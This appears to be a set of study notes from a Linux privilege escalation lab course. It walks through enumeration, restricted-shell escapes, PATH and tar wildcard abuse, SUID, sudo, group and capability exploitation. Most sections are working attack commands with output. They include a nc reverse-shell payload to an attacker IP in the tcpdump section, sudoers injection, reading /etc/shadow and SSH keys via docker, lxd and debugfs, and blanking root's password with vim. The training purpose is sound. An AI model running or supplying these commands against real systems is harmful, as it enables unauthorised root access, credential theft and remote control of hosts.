-rw-r--r-- 1 root root 448 Nov 28 12:31 /run/tmpfiles.d/static-nodes.conf
-rw-r--r-- 1 root root  71 Nov 28 12:31 /run/NetworkManager/resolv.conf
-rw-r--r-- 1 root root  72 Nov 28 12:31 /run/NetworkManager/no-stub-resolv.conf
-rw-r--r-- 1 systemd-resolve systemd-resolve 736 Nov 28 12:31 /run/systemd/resolve/stub-resolv.conf
<SNIP>
Scripts

Shell scripts and other automation scripts on the system reveal internal processes, backup routines, database interactions, and credential usage that is not visible from the process list alone. Administrators often write scripts to automate maintenance tasks and leave them with overly permissive file permissions, or they call other binaries using relative paths instead of absolute paths. Either of these mistakes is directly exploitable. Finding scripts that run as root via cron or systemd timers that are world-writable — or that call writable binaries — provides a direct path to privilege escalation. The find command filtered for .sh files and excluding standard source code and snap directories gives a practical list of custom scripts worth examining. Also check the process list filtered for root to see which scripts are actively executing as root at the time of enumeration.

$ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

/home/htb-student/automation.sh
/etc/wpa_supplicant/action_wpa.sh
/etc/wpa_supplicant/ifupdown.sh
/etc/init.d/hwclock.sh
<SNIP>
Running Services by User

The ps aux command filtered for root shows every process currently running under the root user account. This is important because any process running as root that has a vulnerability — whether a buffer overflow, command injection, or insecure file handling issue — is a direct path to root-level code execution. Services running as root that are also reachable from the network are especially high-value targets. Custom binaries and scripts in unusual paths like /opt, /srv, or /home running as root are particularly interesting because they are likely in-house code with less security scrutiny than standard packaged software. Even looking at the exact binary paths and command-line arguments of root processes can reveal credentials passed as arguments, configuration file locations, or other useful information about how the service is configured.

$ ps aux | grep root

root    1   0.0  0.2 168196 11364 ? Ss 12:31 0:01 /sbin/init splash
root  378   0.5  0.4  62648 17212 ? S  12:31 0:00 /lib/systemd/systemd-journald
root  752   0.0  0.2  58780 10608 ? Ss 12:31 0:00 /usr/bin/VGAuthService
root  778   0.0  0.0  18052  2992 ? Ss 12:31 0:00 /usr/sbin/cron -f
root  784   0.4  0.5 273512 21680 ? Ss 12:31 0:00 /usr/sbin/NetworkManager --no-daemon
root  792   0.1  0.5  48244 20540 ? Ss 12:31 0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher
root  793   1.3  0.2 239180 11832 ? Ss 12:31 0:00 /usr/lib/policykit-1/polkitd --no-debug
<SNIP>
Credential Hunting

Credential hunting is the process of systematically searching the filesystem for stored usernames, passwords, keys, and tokens that can be used to escalate privileges or move laterally. Configuration files with extensions like .conf, .config, .xml, .ini, and .env are the most common locations. The /var directory typically contains the web root for whatever web server is running and web application config files in /var/www/ frequently contain database credentials in plaintext. WordPress installations store database credentials in wp-config.php under the DB_USER and DB_PASSWORD constants which can be extracted with a simple grep. The spool and mail directories can also contain sensitive messages with credentials. Any password found anywhere should immediately be tried against every user account on the system and every internal service — password reuse is the most reliable attack multiplier in real-world environments.

$ grep 'DB_USER\|DB_PASSWORD' /var/www/html/wp-config.php

define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'WPadmin123!' );

$ find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/python3/debian_config
/boot/config-4.4.0-116-generic
<SNIP>
SSH Keys

SSH private keys are among the most valuable artifacts you can find during privilege escalation enumeration because they allow passwordless authentication to other systems without needing to crack any hash or know any password. If you find a private key belonging to a more privileged user or an administrator you can use it to SSH back into the same box as that user or authenticate to other systems in the environment entirely. The ~/.ssh/ directory is the standard location to check but keys can be placed anywhere on the filesystem. Always check the known_hosts file alongside any SSH keys found — it contains a list of public key fingerprints for every host the user has previously connected to, giving you a direct map of what other systems this user accesses and are therefore reachable and worth targeting from this machine.

$ ls ~/.ssh

id_rsa  id_rsa.pub  known_hosts

$ find / -name "id_rsa" 2>/dev/null
$ find / -name "*.pem" 2>/dev/null
$ cat ~/.ssh/known_hosts
Moving On

At this point you have a thorough lay of the land covering OS version, kernel, CPU architecture, login shells, running services, user and group memberships, network topology, mounted filesystems, hidden files, configuration files, credentials, and SSH keys. The next focus shifts to permissions — what directories, scripts, and binaries your current user can read, write, or execute, and how those permissions can be abused to escalate privileges. It is worth running LinPEAS at this stage in any real-world assessment to catch anything that manual enumeration may have missed. However, manual enumeration skills remain essential because tools can be blocked by antivirus, fail on unusual systems, or be unavailable entirely. The goal is to develop a thorough and repeatable personal methodology and build your own cheat sheet of commands that works regardless of what automated tools are available on the target.

Linux Privilege Escalation — Restricted Shells, Sudo, Path, Wildcards, SUID, Capabilities & Privileged Groups
Escaping Restricted Shells

A restricted shell is a type of shell that limits the user's ability to execute commands. In a restricted shell the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories. Restricted shells are often used to provide a safe environment for users who may accidentally or intentionally damage the system, or to provide a way for users to access only certain system features. The key thing to understand is that a restricted shell is not a security boundary by itself — it is a convenience control, and there are multiple well-known techniques to escape it. When you land on a system and find yourself in a restricted shell, the first task is to identify which shell it is, what commands are available, and what the specific restrictions are, so you can choose the right escape technique.

RBASH

Restricted Bourne shell (rbash) is a restricted version of the Bourne shell which is a standard command-line interpreter in Linux. It limits the user's ability to use certain features of the Bourne shell such as changing directories, setting or modifying environment variables, and executing commands in other directories. It is often used to provide a safe and controlled environment for users who may accidentally or intentionally damage the system. When you are placed into rbash you will typically notice that cd does not work, you cannot set PATH, you cannot use absolute paths to execute commands outside a permitted list, and output redirection is often blocked. Identifying rbash is the first step — the shell prompt may say rbash or the command echo $SHELL may reveal /bin/rbash. Once identified you know which escape techniques to attempt.

RKSH

Restricted Korn shell (rksh) is a restricted version of the Korn shell which is another standard command-line interpreter. The rksh shell limits the user's ability to use certain features of the Korn shell such as executing commands in other directories, creating or modifying shell functions, and modifying the shell environment. Unlike rbash, rksh restrictions are slightly different in scope — it focuses more on preventing modification of shell functions and environment changes rather than directory traversal. Understanding which restricted shell you are in matters because the escape technique that works for rbash may not work for rksh. Always check echo $SHELL or echo $0 to identify the shell type as your first step when you suspect you are in a restricted environment.

RZSH

Restricted Z shell (rzsh) is a restricted version of the Z shell which is the most powerful and flexible command-line interpreter of the three. The rzsh shell limits the user's ability to use certain features of the Z shell such as running shell scripts, defining aliases, and modifying the shell environment. Because Z shell is the most feature-rich of the three, its restricted version also has the most complex set of restrictions. However, the very richness of the Z shell also means there are more potential escape paths if the restrictions are not configured perfectly. When in rzsh always try common escape paths such as spawning a subshell through an editor or using command substitution before attempting more complex techniques.

Escaping — General Concept

The general concept of escaping a restricted shell means finding a way to break out of the restrictions imposed by the shell and gain access to a full unrestricted shell environment. Several methods exist and each one exploits a different gap in how the restricted shell implements its controls. The most important thing to understand is that restricted shells are only as strong as their configuration — a single misconfigured allowed command can be enough to escape entirely. The techniques available include command injection, command substitution, command chaining, environment variable manipulation, and shell functions. In enterprise networks administrators use restricted shells to control what contractors, external partners, and employees can do on Linux servers. Each user group gets a different shell matched to their access level, but all of them have potential escape paths if the configuration is not airtight.

Command Injection

Command injection is a technique where you inject additional commands into an input that the restricted shell accepts, causing the shell to execute commands beyond what it was designed to allow. Imagine you are in a restricted shell that only permits the ls command with a fixed set of arguments. Even though you cannot directly run pwd, you can inject it as a subcommand within the argument of ls using backtick syntax. The shell processes the backtick expansion first, executing pwd, and then passes the result to ls. This allows you to run any command that is not directly blocked, as long as you can embed it inside a permitted command's argument. This works because the restriction is on the command name typed directly, not on what gets evaluated inside arguments.

$ ls -l `pwd`

This causes pwd to execute first as a subcommand, then its output is passed as an argument to ls. You have now executed pwd even though the shell did not allow it directly.

Command Substitution

Command substitution is another escape method that uses the shell's own syntax for embedding one command's output into another. The standard syntax uses backticks or the $() form. If the restricted shell processes either of these substitution forms without restriction, you can use them to execute arbitrary commands by wrapping them inside allowed commands or simply by using them directly if the shell's parser evaluates them before applying restrictions. The key difference from command injection is that substitution specifically uses the shell's built-in substitution mechanism rather than injecting into an argument string. If the shell allows any form of substitution it is effectively allowing arbitrary command execution because the substituted command runs with the same shell's privileges before the restriction check happens.

$ echo $(cat /etc/passwd)
$ echo `whoami`
Command Chaining

Command chaining involves using shell metacharacters to string multiple commands together on a single line so that the shell executes them in sequence. The most common metacharacters for this are the semicolon ; which runs the next command regardless of the previous command's exit code, the pipe | which passes one command's output as input to the next, && which runs the next command only if the previous succeeded, and || which runs the next command only if the previous failed. If the restricted shell allows any of these metacharacters in its input parsing, you can chain a permitted command together with a command that is not permitted. The restricted shell may only check the first token of the input line as the command name, missing the chained command entirely.

$ ls ; /bin/bash
$ ls | /bin/sh
$ ls && /bin/bash
Environment Variables

Environment variable manipulation as an escape technique involves modifying or creating environment variables that the shell relies on when executing commands. The most commonly abused variable for this purpose is PATH itself. If the restricted shell uses the PATH variable to locate commands and you can modify PATH to point to a directory you control, you can place malicious scripts named the same as restricted commands in that directory and the shell will execute your version instead. Another exploitable variable is SHELL — some programs read the SHELL variable to decide what shell to spawn when needed, so changing SHELL to /bin/bash and then invoking one of those programs causes a full bash shell to be spawned. If the restricted shell allows export or variable assignment at all, this technique is worth trying immediately.

$ export PATH=/tmp:$PATH
$ export SHELL=/bin/bash
Shell Functions

Shell functions as an escape technique involve defining a custom function with the same name as a restricted built-in command or a command you want to run, where the function body executes something the shell would normally block. If the restricted shell permits function definition with the function keyword or the shorthand name() { } syntax, and if it does not check function bodies against its restriction list, you can define a function called anything and inside it execute /bin/bash or any other command. This works because the restriction is applied at the command execution level based on command names typed directly, not on the contents of function bodies that get defined and then called.

$ function escape() { /bin/bash; }
$ escape
Path Abuse

PATH is an environment variable that specifies the set of directories where an executable can be located. When you type a command like ls without a full absolute path, the shell looks through each directory listed in PATH from left to right until it finds a binary matching that name and executes it. PATH abuse as a privilege escalation technique works by inserting a directory you control at the beginning of the PATH so that when a privileged process calls a command by name without a full path, it finds and executes your malicious version of that command instead of the real one. You can check the current PATH with echo $PATH or env | grep PATH.

$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
How PATH Abuse Works in Practice

The core of PATH abuse is that if any SUID binary, sudo-allowed script, or cron job calls a command using a relative name instead of an absolute path like /bin/ls, you can hijack that call. The first thing to check when you discover a SUID binary or a sudo rule is whether the program internally calls other commands by relative name. You can check this by running strings on the binary and looking for command names without leading slashes. If you see something like cat or service or id being called without a full path, that is a PATH hijack candidate.

The attack works by placing a malicious script with the same name as the called command in a directory you control, then prepending that directory to PATH before executing the privileged binary. Adding . (the current directory) to PATH is a particularly common setup for this attack.

$ PATH=.:${PATH}
$ export PATH
$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

Now create a malicious script named the same as whatever command the privileged binary calls:

$ touch ls
$ echo '/bin/bash -p' > ls
$ chmod +x ls

When the SUID binary or sudo command runs and internally calls ls without a full path, it will find your malicious ls in the current directory first and execute it, spawning a privileged shell.

Checking Writable Directories in PATH

An important step after identifying PATH abuse as a possible vector is to check whether any of the directories already listed in the victim user's PATH are writable by you. If any directory in the PATH is world-writable or writable by your user, you do not need to modify PATH at all — you can simply drop your malicious script directly into that directory and it will be found automatically whenever any privileged process calls that command by relative name. To check write permissions on PATH directories:

$ echo $PATH | tr ':' '\n' | while read dir; do
    ls -ld "$dir" 2>/dev/null
  done

drwxrwxrwx 2 root root 4096 Aug 31 /usr/local/sbin    <-- world writable, exploitable
drwxr-xr-x 2 root root 4096 Aug 31 /usr/local/bin
drwxr-xr-x 2 root root 4096 Aug 31 /usr/sbin
drwxr-xr-x 2 root root 4096 Aug 31 /usr/bin

If /usr/local/sbin is world-writable as shown above, you can place a script named service or id or whatever the target binary calls there and it will be picked up when any process running with elevated privileges executes that command by relative name.

PATH Abuse via Script in a PATH Directory

If a script or binary is placed inside a directory that is already in PATH, it becomes executable from anywhere on the system just by typing its name without specifying its full path. This is demonstrated here with a script called conncheck placed in /usr/local/sbin:

$ pwd && conncheck
/usr/local/sbin
Active Internet connections (servers and established)
Proto  Local Address    Foreign Address   State    PID/Program
tcp    0.0.0.0:22       0.0.0.0:*         LISTEN   1189/sshd

Even when you move to a completely different directory like /tmp, the script still runs because the shell finds it in PATH:

$ pwd && conncheck
/tmp
Active Internet connections (servers and established)
Proto  Local Address    Foreign Address   State    PID/Program
tcp    0.0.0.0:22       0.0.0.0:*         LISTEN   1189/sshd

The practical attack: if you can write to any directory in PATH, place your malicious payload there named the same as a command called by a root-owned process.

Demonstrating the Full PATH Abuse Attack

This demonstrates the complete PATH abuse attack from start to finish. First prepend . to PATH so the current directory is searched first. Then create a file called ls containing a payload and make it executable. When any privileged process in the same directory calls ls without a full path, your file runs instead of the real /bin/ls.

$ PATH=.:${PATH}
$ export PATH
$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ touch ls
$ echo 'echo "PATH ABUSE!!"' > ls
$ chmod +x ls
$ ls
PATH ABUSE!!

Replace echo "PATH ABUSE!!" with /bin/bash -p or a reverse shell payload when targeting a real SUID binary or cron job.

Wildcard Abuse

Wildcard abuse is a privilege escalation technique that exploits the way the shell expands wildcard characters before passing arguments to commands. When a command uses * as part of its arguments, the shell replaces * with a list of all filenames in the current directory before the command runs. This means that if you create files whose names look like command-line flags or options, those filenames will be interpreted as actual options by the command when the wildcard expands. The wildcard characters and their meanings are:

*    — matches any number of characters in a filename
?    — matches exactly one character
[ ]  — matches any single character listed inside the brackets
~    — expands to the current user's home directory
-    — inside brackets, denotes a range of characters
Wildcard Abuse via tar and Cron

The tar command is one of the most commonly exploited programs for wildcard abuse because it has options like --checkpoint and --checkpoint-action that allow executing arbitrary commands during the archive process. When a cron job uses tar with a wildcard like tar -zcf backup.tar.gz *, the shell expands * into all filenames in the directory before tar runs. If you create files whose names are --checkpoint=1 and --checkpoint-action=exec=sh root.sh, those filenames become command-line arguments to tar, triggering execution of your script. This works because tar's option parsing does not distinguish between arguments passed on the command line and those that result from wildcard expansion. The cron job below runs every minute and is a perfect target:

*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *

Step 1 — Create the payload script that adds your user to sudoers:

$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

Step 2 — Create files named as tar options so the wildcard expansion passes them as arguments:

$ echo "" > "--checkpoint-action=exec=sh root.sh"
$ echo "" > --checkpoint=1

Step 3 — Verify the files were created correctly:

$ ls -la

-rw-rw-r-- 1 htb-student htb-student   1 Aug 31 23:11 --checkpoint=1
-rw-rw-r-- 1 htb-student htb-student   1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
-rw-rw-r-- 1 htb-student htb-student  60 Aug 31 23:11 root.sh

Step 4 — Wait for the cron job to run, then check sudo privileges:

$ sudo -l

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL

$ sudo su -
root@NIX02:~#
Special Permissions — SUID

The Set User ID upon Execution (setuid or SUID) permission bit allows a user to execute a binary with the permissions of the file's owner rather than the permissions of the user who is running it. In practice this means that if a binary is owned by root and has the SUID bit set, any user who executes it will run it as root regardless of their own privilege level. The SUID bit appears as s in the owner execute position of the file's permission string: -rwsr-xr-x. This is a legitimate feature used by programs like passwd that need root access to modify /etc/shadow on behalf of any user. However when SUID is set on a binary that has exploitable features — such as the ability to spawn a shell, read arbitrary files, or execute system commands — it becomes a direct privilege escalation vector.

Finding All SUID Binaries

The first step with SUID privilege escalation is to find every binary on the system that has the SUID bit set. The find command below searches the entire filesystem for files owned by root with the SUID permission bit set and lists them with full permission details. Run this immediately after gaining a shell and save the output.

$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root  16728 Sep  1 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root  16728 Sep  1 /home/mrb3n/payroll
-rwsr-xr-x 1 root root  40152 Nov 30 /bin/mount
-rwsr-xr-x 1 root root  40128 May 17 /bin/su
-rwsr-xr-x 1 root root  44168 May  7 /bin/ping
-rwsr-xr-x 1 root root  23376 Jan 18 /usr/bin/pkexec
-rwsr-xr-x 1 root root 136808 Jul  4 /usr/bin/sudo
-rwsr-xr-x 1 root root  54256 May 17 /usr/bin/passwd
-rwsr-xr-x 1 root root 1588768 Aug 31 /usr/bin/screen-4.5.0
<SNIP>
What to Do After Finding SUID Binaries

Finding the list of SUID binaries is only the first step. The next step is to analyse each one and determine if it can be exploited. There are three things to check for each SUID binary you find:

Check write permissions on the SUID binary itself — if you can write to a SUID binary owned by root, you can overwrite it with your own payload and it will execute as root when run:

$ ls -la /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 1588768 Aug 31 /usr/bin/screen-4.5.0

$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null | \
  while read perms links owner group size date file; do
    if [ -w "$file" ]; then echo "WRITABLE SUID: $file"; fi
  done

Check the binary against GTFOBins — many standard SUID binaries have documented exploitation techniques on GTFOBins. If vim, find, python, nmap, env, bash, or similar tools appear with SUID set, they can be trivially exploited to get a root shell. Search the binary name on https://gtfobins.github.io with the SUID filter applied.

Check what the binary calls internally — use strings on the SUID binary to see if it calls other commands by relative name rather than absolute path. If it does, combine this with the PATH abuse technique above:

$ strings /home/htb-student/payroll | grep -v lib | grep -v "/"

service
cat
id

If service appears without a full path and the binary is SUID root, prepend your malicious service script to PATH and execute the SUID binary.

SUID — SETGID Binaries

The Set-Group-ID (setgid) permission bit is similar to SUID but applies to group ownership instead of user ownership. A binary with the setgid bit set runs with the permissions of the group that owns it, regardless of what group the executing user belongs to. The setgid bit appears as s in the group execute position: -rwxr-sr-x. These binaries are found with a slightly different find command using permission mask 6000 which checks for both SUID and SGID simultaneously:

$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 root root 85832 Nov 30 2017 /usr/lib/snapd/snap-confine

These files can be leveraged in exactly the same way as SUID binaries. Check them against GTFOBins, check for write permissions on the binary itself, and check what they call internally using strings.

GTFOBins

GTFOBins is a curated public database of Unix binaries and scripts that can be used by an attacker to bypass security restrictions, escape restricted shells, escalate privileges, spawn reverse shell connections, and transfer files when those binaries are available with SUID, sudo, or capability permissions. The name stands for "Get The F*** Out Binaries." Every entry on the site documents the exact commands needed to abuse a specific binary under specific conditions — SUID, sudo, capabilities, file write, file read, and so on. In the context of SUID and sudo privilege escalation, GTFOBins is your primary reference after you have enumerated what is available on the target system. For example, apt-get with sudo can spawn a root shell through its Pre-Invoke hook:

$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)

The workflow is: enumerate SUID binaries and sudo rules → take each binary name → search GTFOBins → apply the documented technique for the specific permission context (SUID, sudo, capabilities). Familiarise yourself with as many GTFOBins entries as possible so you can immediately recognise exploitation opportunities when you see a binary name in a permission listing.

Sudo Rights Abuse

Sudo privileges allow an account to run certain commands in the context of root or another user without switching to that user or requiring the root password. When sudo is invoked the system checks the /etc/sudoers file to determine whether the current user has the appropriate rights for the command they are trying to run. The /etc/sudoers file is configured by the system administrator and can be highly specific — allowing only one command — or dangerously broad. The very first command to run on any system after gaining a shell is sudo -l, which lists all sudo permissions the current user has. Entries marked NOPASSWD can be seen and used without knowing the user's password at all, making them especially valuable for privilege escalation. A misconfigured sudo entry is one of the most common and reliable paths to root in real environments and CTF machines alike.

$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
What to Do After Running sudo -l

After running sudo -l, you need to analyse each entry carefully. There are several scenarios and each has a different exploitation path:

NOPASSWD with a specific binary — you can run that binary as root without any password. Immediately search GTFOBins for that binary name with the sudo filter. If it appears, follow the documented technique. Common examples include find, vim, python, nmap, awk, perl, ruby, env, bash, and less.

NOPASSWD with a script path — check whether you have write permission on that script file itself. If you can write to the script that sudo allows you to run as root, you can replace its contents with your payload and then execute it via sudo to get a root shell:

$ sudo -l
(root) NOPASSWD: /opt/scripts/backup.sh

$ ls -la /opt/scripts/backup.sh
-rwxrwxr-x 1 root root 45 Aug 31 /opt/scripts/backup.sh    <-- world writable

$ echo '/bin/bash -p' > /opt/scripts/backup.sh
$ sudo /opt/scripts/backup.sh
root@NIX02:~#

NOPASSWD with a binary that has dangerous flags — the allowed binary may have features that can be used to execute arbitrary commands even when invoked under the specific path listed in sudoers. This is the tcpdump case where the -z postrotate-command flag allows executing any script when tcpdump rotates its capture file.

Sudo Abuse via tcpdump Postrotate

When tcpdump is allowed via sudo, it can be abused through its -z postrotate-command option which executes a specified script every time the capture file rotates. This allows execution of arbitrary code as root. The technique works by creating a shell script with a reverse shell payload, then running tcpdump with flags that force an immediate rotation and specify your script as the postrotate command. AppArmor in recent Ubuntu distributions has restricted this specific vector but it remains viable on older systems and in many enterprise Linux environments where AppArmor is not deployed.

Step 1 — Create the payload script:

$ cat /tmp/.test
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f

Step 2 — Start netcat listener on your attack machine:

$ nc -lnvp 443

Step 3 — Execute tcpdump with the postrotate abuse:

$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB
Maximum file limit reached: 1

Step 4 — Root shell received:

connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
root@NIX02:~# id
uid=0(root) gid=0(root) groups=0(root)
Sudo Best Practices to Know as an Attacker

Understanding the two key misconfigurations that make sudo entries exploitable helps you immediately recognise vulnerable entries when you see them in sudo -l output. First, if the sudoers entry specifies a binary without its full absolute path (writing cat instead of /bin/cat), it is vulnerable to PATH abuse — you can create a malicious script named cat in a directory prepended to PATH, and when sudo runs cat it will find and execute your version first. Second, overly broad sudo grants such as ALL or entire script directories are dangerous — always check if the specific allowed path is writable, and always cross-reference every binary on GTFOBins immediately.

Two rules to always check:
1. Is the binary in sudoers specified with an absolute path? No = PATH abuse possible.
2. Is the script or binary that sudo allows writable by you? Yes = overwrite it with your payload.
Privileged Groups

Linux group membership is one of the most underestimated privilege escalation vectors. Certain groups grant permissions that are effectively equivalent to root access even though the user is not directly added to the sudoers file and does not appear to have elevated privileges. When you run id or read /etc/group, always check every group your user belongs to against this list. The groups that matter most for privilege escalation are LXD, Docker, Disk, and ADM. Each provides a completely different path to root or to sensitive data, and understanding how each one works means that when you see membership in any of these groups you can immediately execute the appropriate escalation technique without needing to look anything up.

LXC / LXD

LXD is Ubuntu's container manager, similar to Docker. Upon installation of LXD on an Ubuntu system, all users are automatically added to the lxd group. Membership in this group allows creating and managing containers. The privilege escalation technique works by creating a new privileged LXD container, mounting the host's entire root filesystem into the container, and then spawning a shell inside the container where you have root access to the mounted host filesystem. This gives you complete read and write access to every file on the host including /etc/shadow, SSH keys, and any other sensitive data, all without needing a password.

Step 1 — Confirm LXD group membership:

$ id
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)

Step 2 — Unzip and import an Alpine Linux image:

$ unzip alpine.zip
$ cd 64-bit\ Alpine/
$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Step 3 — Initialise LXD with defaults:

$ lxd init

Step 4 — Create a privileged container with security.privileged=true so the root user inside the container maps directly to root on the host:

$ lxc init alpine r00t -c security.privileged=true

Step 5 — Mount the host root filesystem into the container:

$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Step 6 — Start the container and get a root shell inside it:

$ lxc start r00t
$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)

~ # cd /mnt/root/root
~ # cat /mnt/root/etc/shadow

The entire host filesystem is now accessible at /mnt/root inside the container with full root privileges.

Docker

Placing a user in the docker group is essentially equivalent to giving them unrestricted root-level access to the entire host filesystem without requiring a password. Members of the docker group can create new Docker containers and mount any directory from the host into those containers. The attack is simple: spin up a container with the host root directory mounted into it, then browse the mounted filesystem as root inside the container. This allows reading /etc/shadow for offline cracking, reading root's SSH keys, writing new SSH keys for persistent access, or adding a privileged user directly to /etc/passwd and /etc/shadow.

$ id
uid=1001(user) gid=1001(user) groups=1001(user),999(docker)

$ docker run -v /root:/mnt -it ubuntu

root@container:/# id
uid=0(root) gid=0(root)

root@container:/# ls /mnt
.bash_history  .ssh  root.txt

root@container:/# cat /mnt/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
...

Mount /etc instead of /root to read and modify /etc/shadow and /etc/passwd for persistence.

Disk

Users within the disk group have full raw read and write access to any block device in /dev, which includes /dev/sda1 the main disk device used by the operating system. This is dangerous because raw device access completely bypasses filesystem-level permission checks — you are reading and writing directly to the disk blocks, not going through the kernel's permission enforcement. The tool debugfs provides an interactive filesystem debugger that works directly on block devices and can be used to read any file on the system including /etc/shadow. This is effectively root-level file access without ever needing a root shell.

$ id
uid=1001(user) gid=1001(user) groups=1001(user),6(disk)

$ debugfs /dev/sda1
debugfs: cat /etc/shadow
root:$6$salt$hashhashhashhash...:19000:0:99999:7:::
htb-student:$6$salt$hashhashhashhash...:19000:0:99999:7:::

debugfs: cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
...
ADM

Members of the adm group are able to read all logs stored in /var/log. This does not directly grant a root shell, but is highly valuable because system log files frequently contain sensitive data including credentials logged in error messages, authentication tokens, session information, and detailed records of what commands users and automated processes have been running. Reviewing logs can reveal cron job activity, what services are running and how they are configured, and in some cases plaintext passwords that applications accidentally wrote to their log output. Log review with adm group access is a reconnaissance step that often leads to other privilege escalation paths.

$ id
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)

$ cat /var/log/auth.log | grep -i password
$ cat /var/log/apache2/error.log | grep -i pass
$ ls -la /var/log/
Capabilities

Linux capabilities are a security feature that breaks up the traditional all-or-nothing root privilege model into smaller individual units of privilege that can be granted to specific processes or binaries independently. Instead of running an entire program as root just so it can bind to port 80, you can grant only cap_net_bind_service to that specific binary and it can bind to privileged ports without having any other root-level permissions. This is intended to improve security through the principle of least privilege at the process level. However capabilities become a privilege escalation vector when they are set on binaries that have additional dangerous features — for example if vim is given cap_dac_override which allows bypassing file permission checks, any user who runs that vim binary can read and write any file on the system regardless of permissions.

Setting a capability uses the setcap command:

$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
Capability Values Explained

When capabilities are assigned using setcap, three different value suffixes control how the capability is granted and inherited:

=      — clears the capability; removes it from the binary
+ep    — grants Effective and Permitted: the binary can use the capability immediately
+ei    — grants Effective and Inheritable: the binary and its child processes inherit the capability
+p     — grants Permitted only: the capability is available but not active until explicitly raised

The most dangerous value from an attacker's perspective is +ep or =eip because it means the capability is immediately active when the binary runs. If you find cap_setuid=eip or cap_dac_override=eip on a binary, that binary is directly exploitable for privilege escalation.

Important Capabilities Reference Table
cap_sys_admin      — broad administrative privileges; modify system files, mount filesystems
cap_sys_chroot     — change root directory; can be used to escape chroot jails
cap_sys_ptrace     — attach to and debug other processes; can read memory of any process
cap_sys_nice       — raise/lower process priority; can starve other processes of CPU
cap_sys_time       — modify the system clock; affects log timestamps and scheduled jobs
cap_sys_resource   — modify resource limits like open file descriptors and memory
cap_sys_module     — load and unload kernel modules; can insert a rootkit kernel module
cap_net_bind_service — bind to ports below 1024; used legitimately by web servers
cap_setuid         — set effective UID; can switch to root UID directly
cap_setgid         — set effective GID; can switch to root GID directly
cap_dac_override   — bypass file read/write/execute permission checks entirely
Enumerating Capabilities

The first step in capability-based privilege escalation is finding every binary on the system that has capabilities set. The getcap tool reads the capabilities from a binary's extended attributes. Running getcap individually on every binary would take too long, so the find command is used to search all standard binary directories and run getcap on each file automatically. This one command gives you a complete picture of every capability assignment on the system. Run this immediately after landing on a system as part of your standard enumeration.

$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
What to Do After Finding Capabilities

After running the capability enumeration command, analyse each result. The key question for each capability-set binary is: what does this specific capability allow, and does this binary have any feature that lets me use that capability to read sensitive files, write to restricted files, or spawn a shell?

The most immediately exploitable capabilities are:

cap_setuid — if any binary has this set, it can change its own UID to 0 (root). If that binary is an interpreter like Python or Perl, you can write a one-liner to set UID to 0 and spawn a shell:

$ getcap /usr/bin/python3
/usr/bin/python3 cap_setuid=ep

$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@NIX02:~# id
uid=0(root)

cap_dac_override — if a binary like vim has this set, it can read and write any file bypassing permission checks. Use it to modify /etc/passwd or /etc/sudoers:

$ getcap /usr/bin/vim.basic
/usr/bin/vim.basic cap_dac_override=eip
Exploiting cap_dac_override with vim

The cap_dac_override capability allows the binary to bypass all file read, write, and execute permission checks on the entire filesystem. When this is set on vim, any user who runs vim can open and modify any file including root-owned files like /etc/passwd and /etc/sudoers. The exploit technique is to use vim to remove the password hash from the root entry in /etc/passwd, replacing the x placeholder with nothing, so that root has no password set and su will accept an empty password to switch to root.

Step 1 — Check the current root entry in /etc/passwd:

$ cat /etc/passwd | head -n1
root:x:0:0:root:/root:/bin/bash

Step 2 — Use vim with cap_dac_override to remove the password field non-interactively:

$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

Step 3 — Verify the change:

$ cat /etc/passwd | head -n1
root::0:0:root:/root:/bin/bash

The x is gone. The root account now has no password.

Step 4 — Switch to root with no password:

$ su
Password:          <-- just press Enter
root@NIX02:~# id
uid=0(root) gid=0(root) groups=0(root)
